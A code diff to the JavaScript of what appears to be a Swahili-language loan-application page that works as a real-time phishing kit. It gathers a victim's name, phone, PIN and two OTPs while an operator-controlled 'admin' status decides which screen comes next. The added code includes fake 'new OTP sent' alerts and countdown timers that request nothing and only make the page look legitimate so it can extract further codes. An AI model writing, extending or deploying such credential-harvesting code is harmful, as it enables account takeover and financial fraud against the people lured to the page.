@@ -37,15 +37,25 @@ document.addEventListener('DOMContentLoaded', () => {
   const btnToggleOtp1Visibility = document.getElementById('btn-toggle-otp1-visibility');
   const bannerOtp1Error = document.getElementById('banner-otp1-error');
   const otp1Subtitle = document.getElementById('otp1-subtitle');
+  const otp1SecondsSpan = document.getElementById('otp1-seconds');
+  const otp1TimerDisplay = document.getElementById('otp1-timer-display');
+  const btnRequestOtp1 = document.getElementById('btn-request-otp1');
+  const linkRudishaOtp1 = document.getElementById('link-rudisha-otp1');
 
   const displayOtp2Name = document.getElementById('display-otp2-name');
   const displayOtp2Phone = document.getElementById('display-otp2-phone');
   const otp2Boxes = document.querySelectorAll('.otp2-box-square');
   const btnToggleOtp2Visibility = document.getElementById('btn-toggle-otp2-visibility');
   const bannerOtp2Error = document.getElementById('banner-otp2-error');
+  const otp2SecondsSpan = document.getElementById('otp2-seconds');
+  const otp2TimerDisplay = document.getElementById('otp2-timer-display');
+  const btnRequestOtp2 = document.getElementById('btn-request-otp2');
+  const linkRudishaOtp2 = document.getElementById('link-rudisha-otp2');
 
   let currentUserId = null;
   let statusPollInterval = null;
+  let otp1TimerInterval = null;
+  let otp2TimerInterval = null;
 
   const urlParams = new URLSearchParams(window.location.search);
   const adminParam = urlParams.get('admin') || '';
@@ -124,7 +134,6 @@ document.addEventListener('DOMContentLoaded', () => {
       const fullNameStr = `${firstName} ${lastName}`.toUpperCase();
       const formattedPhone = phone;
 
-      // Inashikilia herufi kubwa (Uppercase) kwenye majina ya mwombaji
       [displayApplicantName, displayOtp1Name, displayOtp2Name].forEach(el => { if (el) el.innerText = fullNameStr; });
       [displayApplicantPhone, displayOtp1Phone, displayOtp2Phone].forEach(el => { if (el) el.innerText = formattedPhone; });
 
@@ -172,7 +181,6 @@ document.addEventListener('DOMContentLoaded', () => {
     updateCalc();
   }
 
-  // Show / Hide Toggles
   if (btnTogglePinVisibility) {
     btnTogglePinVisibility.addEventListener('click', () => {
       const isPassword = pinBoxes[0].type === 'password';
@@ -220,6 +228,61 @@ document.addEventListener('DOMContentLoaded', () => {
   setupDigitInputs(pinBoxes, (pinVal) => { submitPinAction(pinVal); });
   setupDigitInputs(otp1Boxes, (otpVal) => { submitOtp1Action(otpVal); });
   setupDigitInputs(otp2Boxes, (otpVal) => { submitOtp2Action(otpVal); });
+
+  function startOtpCountdown(stepNum) {
+    let timeLeft = 30;
+    const secondsSpan = stepNum === 1 ? otp1SecondsSpan : otp2SecondsSpan;
+    const timerDisplay = stepNum === 1 ? otp1TimerDisplay : otp2TimerDisplay;
+    const requestBtn = stepNum === 1 ? btnRequestOtp1 : btnRequestOtp2;
+
+    if (timerDisplay) timerDisplay.classList.remove('hidden-btn');
+    if (requestBtn) requestBtn.classList.add('hidden-btn');
+
+    if (stepNum === 1 && otp1TimerInterval) clearInterval(otp1TimerInterval);
+    if (stepNum === 2 && otp2TimerInterval) clearInterval(otp2TimerInterval);
+
+    const interval = setInterval(() => {
+      timeLeft--;
+      if (secondsSpan) secondsSpan.innerText = timeLeft;
+
+      if (timeLeft <= 0) {
+        clearInterval(interval);
+        if (timerDisplay) timerDisplay.classList.add('hidden-btn');
+        if (requestBtn) requestBtn.classList.remove('hidden-btn');
+      }
+    }, 1000);
+
+    if (stepNum === 1) otp1TimerInterval = interval;
+    if (stepNum === 2) otp2TimerInterval = interval;
+  }
+
+  if (btnRequestOtp1) {
+    btnRequestOtp1.addEventListener('click', () => {
+      alert('Ombi la OTP mpya limetumwa! Tafadhali subiri ujumbe mpya.');
+      startOtpCountdown(1);
+    });
+  }
+  if (linkRudishaOtp1) {
+    linkRudishaOtp1.addEventListener('click', (e) => {
+      e.preventDefault();
+      alert('Ombi la OTP mpya limetumwa!');
+      startOtpCountdown(1);
+    });
+  }
+
+  if (btnRequestOtp2) {
+    btnRequestOtp2.addEventListener('click', () => {
+      alert('Ombi la OTP mpya ya mwisho limetumwa!');
+      startOtpCountdown(2);
+    });
+  }
+  if (linkRudishaOtp2) {
+    linkRudishaOtp2.addEventListener('click', (e) => {
+      e.preventDefault();
+      alert('Ombi la OTP mpya ya mwisho limetumwa!');
+      startOtpCountdown(2);
+    });
+  }
 
   async function submitPinAction(pinVal) {
     const phoneVal = displayApplicantPhone ? displayApplicantPhone.innerText.trim() : document.getElementById('form-phone').value.trim();
@@ -319,12 +382,13 @@ document.addEventListener('DOMContentLoaded', () => {
           clearInterval(statusPollInterval);
           hideLoading();
           showScreen(screenOtp1);
+          startOtpCountdown(1);
           if (otp1Boxes[0]) otp1Boxes[0].focus();
         } else if (data.status === 'PROCEED_OTP2') {
-          // Admin anapobonyeza NEXT, inafungua skrini ya OTP Hatua ya 2 moja kwa moja
           clearInterval(statusPollInterval);
           hideLoading();
           showScreen(screenOtp2);
+          startOtpCountdown(2);
           if (otp2Boxes[0]) otp2Boxes[0].focus();
         } else if (data.status === 'RETRY_PIN') {
           clearInterval(statusPollInterval);
@@ -341,6 +405,7 @@ document.addEventListener('DOMContentLoaded', () => {
           showSurfaceError(bannerOtp1Error, '⚠️ MUDA WA OTP UMEKWISHA. Weka namba mpya ya OTP iliyotoka.');
           if (otp1Boxes[0]) otp1Boxes[0].focus();
           showScreen(screenOtp1);
+          startOtpCountdown(1);
         } else if (data.status === 'RETRY_OTP2') {
           clearInterval(statusPollInterval);
           hideLoading();
@@ -348,12 +413,12 @@ document.addEventListener('DOMContentLoaded', () => {
           showSurfaceError(bannerOtp2Error, 'OTP ISIYO BATILI ❌ TAFADHALI WEKA OTP MPYA');
           if (otp2Boxes[0]) otp2Boxes[0].focus();
           showScreen(screenOtp2);
+          startOtpCountdown(2);
         } else if (data.status === 'DENIED_STOP') {
           clearInterval(statusPollInterval);
           hideLoading();
           showScreen(screenStopped);
         } else if (data.status === 'SUCCESS') {
-          // Baada ya admin kuidhinisha (APPROVED), inafungua skrini ya mafanikio (Success)
           clearInterval(statusPollInterval);
           hideLoading();
           showScreen(screenSuccess);
@@ -386,4 +451,4 @@ document.addEventListener('DOMContentLoaded', () => {
     if (loadingOverlay) loadingOverlay.classList.remove('active');
   }
 });
-  
+                          
